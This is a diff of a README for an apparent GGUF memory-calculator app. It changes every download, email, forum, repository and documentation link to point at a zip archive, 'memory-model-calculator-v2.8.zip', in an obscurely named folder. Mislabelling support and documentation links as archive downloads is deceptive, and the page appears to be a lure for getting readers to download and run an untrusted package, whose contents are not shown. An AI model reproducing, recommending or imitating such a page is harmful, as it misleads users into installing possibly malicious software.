@@ -1,14 +1,14 @@
 # 🖥️ model-memory-calculator - Easy Memory Calculator for GGUF
 
 ## 🔗 Download Now!
-[![Download](https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip%20release-blue)](https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip)
+[![Download](https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip%20release-blue)](https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the model-memory-calculator! This application helps you quickly calculate memory requirements for GGUF models. It’s designed for everyone, even if you have no programming skills.
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the software:  
-[Download the latest release](https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip)
+[Download the latest release](https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip)
 
 After downloading, follow these steps to install the application:
 
@@ -40,8 +40,8 @@ Using the model-memory-calculator is straightforward. Once you open the applicat
 ## 📬 Support
 If you encounter any issues or have questions, you can reach out for support:
 
-- **Email:** https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip
-- **Community Forum:** [Visit our forum](https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip)
+- **Email:** https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip
+- **Community Forum:** [Visit our forum](https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip)
 
 ## 🌟 Acknowledgments
 Thanks to everyone who contributed to this project. Your input helps improve the application.
@@ -52,7 +52,7 @@ This application is open-source and available under the MIT License. You can vie
 ## 🔗 Additional Resources
 For more information, tutorials, and updates, check the following links:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip)
-- [Documentation](https://raw.githubusercontent.com/Joshvareba11/model-memory-calculator/main/anisostaminous/model-memory-calculator.zip) 
+- [GitHub Repository](https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip)
+- [Documentation](https://github.com/Joshvareba11/model-memory-calculator/raw/refs/heads/main/anisostaminous/memory-model-calculator-v2.8.zip) 
 
 We hope this application simplifies your model memory calculations. Enjoy!
